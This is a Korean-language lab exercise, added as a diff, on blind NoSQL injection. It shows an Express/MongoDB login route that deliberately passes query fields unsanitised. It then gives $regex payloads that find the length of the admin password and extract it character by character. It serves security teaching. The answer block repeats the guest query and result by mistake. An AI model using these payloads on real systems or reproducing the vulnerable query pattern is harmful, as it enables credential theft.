@@ -1,0 +1,102 @@
+MongoDB 실습 2 :
+    오른쪽 탭은 NodeJS에서 MongoDB를 사용하는 코드입니다.
+    앞의 실습과 같이 Injection이 발생하지만, 로그인에 성공할 경우 uid 만 출력이 됩니다.
+
+    아래의 인터랙티브 모듈을 통해 실습해볼 수 있으며, Blind Injection을 통해 "admin"의 비밀번호를 획득해 보시기 바랍니다.
+
+    Hint. "admin"의 비밀번호는 알파벳 소문자로 구성되어 있으며, 과일 이름입니다.
+
+Source Code :
+    const express = require('express');
+    const app = express();
+    app.use(express.json());
+    app.use(express.urlencoded( {extended : false } ));
+    
+    const mongoose = require('mongoose');
+    const db = mongoose.connection;
+    mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
+    
+    app.get('/query', function(req,res) {
+        db.collection('user').findOne({
+            'uid': req.query.uid,
+            'upw': req.query.upw
+        }, function(err, result){
+            if (err) throw err;
+            console.log(result);
+            if(result){
+                res.send(result['uid']);
+            }else{
+                res.send('undefined');
+            }
+        })
+    });
+    
+    const server = app.listen(80, function(){
+        console.log('app.listen');
+    });
+
+Input :
+    Post Data(json)
+    
+    Input : {"uid": "guest", "upw": "guest"}
+    
+    Query: db.test.test.find({"uid":"guest","upw":"guest"})
+    
+    Result: guest
+
+답 :
+    Post Data(json)
+    
+    Input : {"uid": "admin", "upw": {"$regex": "^apple"}}
+    
+    Query: db.test.test.find({"uid":"guest","upw":"guest"})
+    
+    Result: guest
+
+[ 비밀번호의 길이 정보 획득하기 ] 
+{"uid": "admin", "upw": {"$regex":".{5}"}}
+=> admin
+{"uid": "admin", "upw": {"$regex":".{6}"}}
+=> undefined
+admin의 비밀번호는 5글자 임을 알 수 있습니다.
+이후에 알파벳 소문자를 비교해 가며 응답 값에 따라 참/거짓을 확인할 수 있습니다.
+{"uid": "admin", "upw": {"$regex":"^a"}}
+{"uid": "admin", "upw": {"$regex":"^aa"}}
+{"uid": "admin", "upw": {"$regex":"^ab"}}
+...
+{"uid": "admin", "upw": {"$regex":"^ap"}}
+{"uid": "admin", "upw": {"$regex":"^apa"}}
+...
+...
+{"uid": "admin", "upw": {"$regex":"^apple$"}}
+
+    // $	End of string, or end of line
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
